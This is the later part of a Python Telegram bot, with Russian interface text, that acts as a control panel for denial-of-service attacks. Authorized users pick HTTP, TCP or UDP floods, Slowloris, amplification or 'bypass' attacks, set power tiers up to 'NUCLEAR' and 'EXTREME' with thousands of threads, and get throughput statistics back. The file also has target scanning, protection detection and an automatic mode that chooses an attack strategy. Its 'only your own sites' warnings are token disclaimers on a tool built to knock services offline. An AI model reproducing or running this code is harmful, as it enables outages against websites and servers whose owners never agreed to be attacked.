            prompts={'http':'🎯 HTTP FLOOD','tcp':'🔌 TCP FLOOD','udp':'📡 UDP FLOOD','slow':'🐌 SLOWLORIS','cc':'🎲 CC ATTACK','bypass':'🔓 BYPASS','adaptive':'🧠 ADAPTIVE','amp':'📈 AMPLIFICATION','auto':'🤖 AUTO MODE'}
            await c.message.edit_text(f"{prompts[c.data]}\n⚠️ ТОЛЬКО СВОИ САЙТЫ!\nВведите цель:")
        
        @self.dp.message_handler(state=States.url)
        async def url_handler(m:types.Message,state:FSMContext):
            if m.from_user.id not in AUTHORIZED_USERS:return
            data=await state.get_data();t=data.get('type','http');target=m.text.strip()
            
            if t=='auto':
                await self.auto_attack_mode(m,target)
                await state.finish()
                return
            
            kb=InlineKeyboardMarkup(row_width=3)
            kb.add(InlineKeyboardButton("⚡LIGHT",callback_data=f"l:{t}:{target}"),InlineKeyboardButton("💥MEDIUM",callback_data=f"m:{t}:{target}"),InlineKeyboardButton("🔥HEAVY",callback_data=f"h:{t}:{target}"))
            kb.add(InlineKeyboardButton("💀NUCLEAR",callback_data=f"n:{t}:{target}"),InlineKeyboardButton("🌪️EXTREME",callback_data=f"e:{t}:{target}"),InlineKeyboardButton("⚡CUSTOM",callback_data=f"c:{t}:{target}"))
            await m.reply(f"🎯 {target}\n💥 Выберите мощность:",reply_markup=kb);await state.finish()
        
        @self.dp.callback_query_handler(lambda c:c.data.startswith(("l:","m:","h:","n:","e:","c:")))
        async def power_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            p,t,target=c.data.split(":",2)
            
            configs={
                'l':{'d':30,'th':200,'desc':'LIGHT'},
                'm':{'d':60,'th':500,'desc':'MEDIUM'},
                'h':{'d':90,'th':1000,'desc':'HEAVY'},
                'n':{'d':180,'th':2000,'desc':'NUCLEAR'},
                'e':{'d':300,'th':3000,'desc':'EXTREME'},
                'c':{'d':60,'th':800,'desc':'CUSTOM'}
            }
            
            cfg=configs[p]
            
            if t in ['http','adaptive','bypass']:
                protections=await Utils.auto_detect_protection(target)
                protection_text=f"\n🛡️ Защита: {', '.join(protections) if protections else 'Не обнаружена'}"
            else:protection_text=""
            
            msg=await c.message.edit_text(
                f"🚀 {cfg['desc']} {t.upper()}\n🎯 {target}{protection_text}\n⚡ {cfg['th']} потоков\n⏱ {cfg['d']}с\n\n🔥 ЗАПУСК..."
            )
            
            try:
                if cfg['th']>1500:
                    self.engine.target_rps=2000
                    self.engine.adaptive=True
                
                if t=='http':r=await self.engine.http_flood(target,cfg['d'],cfg['th'])
                elif t=='tcp':h,pt=target.split(":");r=await self.engine.tcp_flood(h,int(pt),cfg['d'],cfg['th'])
                elif t=='udp':h,pt=target.split(":");r=await self.engine.udp_flood(h,int(pt),cfg['d'],cfg['th'])
                elif t=='slow':r=await self.engine.slowloris(target,cfg['d'],min(cfg['th'],800))
                elif t=='cc':r=await self.engine.cc_attack(target,cfg['d'],cfg['th'])
                elif t=='bypass':r=await self.engine.bypass_attack(target,cfg['d'],cfg['th'])
                elif t=='adaptive':r=await self.engine.adaptive_flood(target,cfg['d'],cfg['th'])
                elif t=='amp':h,pt=target.split(":");r=await self.engine.amplification_attack(h,int(pt),cfg['d'],cfg['th'])
                
                self.results.append(r)
                
                txt=f"✅ {r.method} ЗАВЕРШЕН\n🎯 {r.url}\n📊 {r.total:,} запросов\n✅ {r.success:,} успешных ({(r.success/r.total*100):.1f}%)\n❌ {r.failed:,} ошибок\n⚡ {r.rps:,.1f} RPS\n⏱ {r.duration:.1f}с\n📤 {r.bytes_sent:,} байт отправлено\n📥 {r.bytes_recv:,} байт получено"
                
                if hasattr(r,'avg_time') and r.avg_time>0:
                    txt+=f"\n📈 Ср. время: {r.avg_time:.3f}с"
                
                if r.codes:
                    txt+=f"\n📋 HTTP коды:\n"
                    for code,count in sorted(r.codes.items()):
                        emoji="✅" if 200<=code<300 else "⚠️" if 300<=code<400 else "❌"
                        txt+=f"`{code}`: {count:,} {emoji}\n"
                
                if r.rps>1000:txt+="\n🔥 ВЫСОКАЯ ЭФФЕКТИВНОСТЬ!"
                elif r.rps>500:txt+="\n💪 ХОРОШАЯ ЭФФЕКТИВНОСТЬ"
                else:txt+="\n⚠️ Низкая эффективность"
                
                await msg.edit_text(txt)
                
            except Exception as e:await msg.edit_text(f"❌ Ошибка: {str(e)}")
        
        @self.dp.callback_query_handler(lambda c:c.data=="detect")
        async def detect_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            await c.message.edit_text("🛡️ Введите URL для анализа защиты:");await States.config.set()
        
        @self.dp.callback_query_handler(lambda c:c.data=="custom")
        async def custom_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            kb=InlineKeyboardMarkup(row_width=2)
            kb.add(InlineKeyboardButton("🎯 Мульти-HTTP",callback_data="multi_http"),InlineKeyboardButton("🌊 Волновая",callback_data="wave"))
            kb.add(InlineKeyboardButton("🎭 Мимикрия",callback_data="mimic"),InlineKeyboardButton("🔄 Ротация",callback_data="rotate"))
            await c.message.edit_text("⚙️ КАСТОМНЫЕ АТАКИ:\nВыберите тип:",reply_markup=kb)
        
        @self.dp.callback_query_handler(lambda c:c.data in["multi_http","wave","mimic","rotate"])
        async def custom_attack_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            await States.url.set()
            state=self.dp.current_state(chat=c.message.chat.id,user=c.from_user.id)
            await state.update_data(type=c.data)
            await c.message.edit_text(f"⚙️ {c.data.upper()}\nВведите цель:")
        
        @self.dp.callback_query_handler(lambda c:c.data=="monitor")
        async def monitor_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            self.monitoring=not self.monitoring
            status="🟢 ВКЛЮЧЕН" if self.monitoring else "🔴 ВЫКЛЮЧЕН"
            await c.message.edit_text(f"📈 Мониторинг: {status}")
            if self.monitoring:asyncio.create_task(self.start_monitoring(c.message.chat.id))
        
        @self.dp.callback_query_handler(lambda c:c.data=="stats")
        async def stats_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            if not self.results:await c.message.edit_text("📊 Нет данных");return
            
            total_attacks=len(self.results)
            total_requests=sum(r.total for r in self.results)
            total_success=sum(r.success for r in self.results)
            avg_rps=sum(r.rps for r in self.results)/total_attacks if total_attacks>0 else 0
            
            latest=self.results[-1]
            
            txt=f"📊 ОБЩАЯ СТАТИСТИКА:\n🚀 Атак: {total_attacks}\n📊 Запросов: {total_requests:,}\n✅ Успешных: {total_success:,}\n⚡ Ср. RPS: {avg_rps:.1f}\n\n📈 ПОСЛЕДНЯЯ АТАКА:\n{latest.method} -> {latest.url}\n📊 {latest.total:,} | ✅ {latest.success:,} | ❌ {latest.failed:,}\n⚡ {latest.rps:.1f} RPS"
            
            await c.message.edit_text(txt)
        
        @self.dp.callback_query_handler(lambda c:c.data=="stop")
        async def stop_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            self.engine.stop();self.monitoring=False
            await c.message.edit_text("🛑 ВСЕ АТАКИ ОСТАНОВЛЕНЫ!")
        
        @self.dp.callback_query_handler(lambda c:c.data=="scan")
        async def scan_handler(c:types.CallbackQuery):
            if c.from_user.id not in AUTHORIZED_USERS:return
            await c.message.edit_text("🔍 Введите хост для глубокого сканирования:");await States.config.set()
        
        @self.dp.message_handler(state=States.config)
        async def config_handler(m:types.Message,state:FSMContext):
            if m.from_user.id not in AUTHORIZED_USERS:return
            target=m.text.strip();msg=await m.reply("🔍 Глубокое сканирование...")
            
            ping=await Utils.ping(target)
            ports=await Utils.scan_ports(target,[21,22,23,25,53,80,110,143,443,993,995,1433,3306,3389,5432,5984,6379,8080,8443,9200])
            info=await Utils.get_info(f"http://{target}")
            
            if target.startswith('http'):
                protections=await Utils.auto_detect_protection(target)
                vulns=await Utils.vulnerability_scan(target)
            else:protections=[];vulns=[]
            
            txt=f"🔍 СКАНИРОВАНИЕ: {target}\n\n📡 Пинг: {'✅' if ping['ok'] else '❌'} ({ping['ping']}ms)\n\n🔌 ОТКРЫТЫЕ ПОРТЫ:\n"
            open_ports=[str(p) for p,o in ports.items() if o]
            if open_ports:txt+=", ".join(open_ports)
            else:txt+="Не найдены"
            
            if 'server' in info:txt+=f"\n\n🖥 Сервер: {info['server']}"
            if protections:txt+=f"\n🛡️ Защита: {', '.join(protections)}"
            if vulns:txt+=f"\n⚠️ Уязвимости:\n"+"\n".join(vulns)
            
            await msg.edit_text(txt);await state.finish()
    
    async def auto_attack_mode(self,message,target):
        msg=await message.reply("🤖 АВТОМАТИЧЕСКИЙ РЕЖИМ\n🔍 Анализ цели...")
        
        if target.startswith('http'):
            protections=await Utils.auto_detect_protection(target)
            info=await Utils.get_info(target)
            
            strategy="bypass" if protections else "adaptive"
            power_level=1500 if not protections else 800
            duration=120
            
        else:
            strategy="tcp"
            power_level=1000
            duration=90
        
        await msg.edit_text(f"🤖 Стратегия: {strategy.upper()}\n🎯 {target}\n⚡ {power_level} потоков\n🚀 ЗАПУСК...")
        
        try:
            if strategy=='adaptive':r=await self.engine.adaptive_flood(target,duration,power_level)
            elif strategy=='bypass':r=await self.engine.bypass_attack(target,duration,power_level)
            elif strategy=='tcp':h,p=target.split(":");r=await self.engine.tcp_flood(h,int(p),duration,power_level)
            
            self.results.append(r)
            txt=f"🤖 АВТОАТАКА ЗАВЕРШЕНА\n📊 {r.total:,} запросов\n⚡ {r.rps:.1f} RPS\n✅ {(r.success/r.total*100):.1f}% успех"
            await msg.edit_text(txt)
        except Exception as e:
            await msg.edit_text(f"❌ Автоатака failed: {e}")
    
    async def start_monitoring(self,chat_id):
        while self.monitoring:
            if self.engine.running:
                stats=self.engine.stats
                current_rps=stats['req']/(time.time()-self.engine.start_time) if hasattr(self.engine,'start_time') else 0
                
                txt=f"📈 МОНИТОРИНГ\n⚡ RPS: {current_rps:.1f}\n📊 Запросов: {stats['req']:,}\n✅ Успешных: {stats['ok']:,}"
                
                try:await self.bot.send_message(chat_id,txt)
                except:pass
            
            await asyncio.sleep(30)
    
    def run(self):
        print("⚠️ ТОЛЬКО СВОИ РЕСУРСЫ! ⚠️");print("🤖 МАКСИМАЛЬНАЯ МОЩНОСТЬ АКТИВИРОВАНА!")
        executor.start_polling(self.dp,skip_updates=True)

def main():
    if BOT_TOKEN=="YOUR_BOT_TOKEN_HERE":print("❌ Установите BOT_TOKEN!");return
    if AUTHORIZED_USERS==[123456789]:print("❌ Установите AUTHORIZED_USERS!");return
    
    print("="*60)
    print("⚠️  ИСПОЛЬЗУЙТЕ ТОЛЬКО НА СВОИХ РЕСУРСАХ! ")
    print("   от Gustalfo")
    print("="*60)
    print("🚀 МАКСИМАЛЬНАЯ МОЩНОСТЬ АКТИВИРОВАНА :)")
    print("🤖 ПОЛНАЯ АВТОМАТИЗАЦИЯ ВКЛЮЧЕНА")
    print("🛡️ ОБХОД ЗАЩИТ ГОТОВ")
    print("📊 ДЕТАЛЬНАЯ АНАЛИТИКА ВКЛЮЧЕНА")
    print("="*60)
    
    try:
        TelegramBot(BOT_TOKEN).run()
    except KeyboardInterrupt:
        print("\n🛑 Остановка...")
    except Exception as e:
        print(f"❌ Критическая ошибка: {e}")

if __name__=="__main__":main()
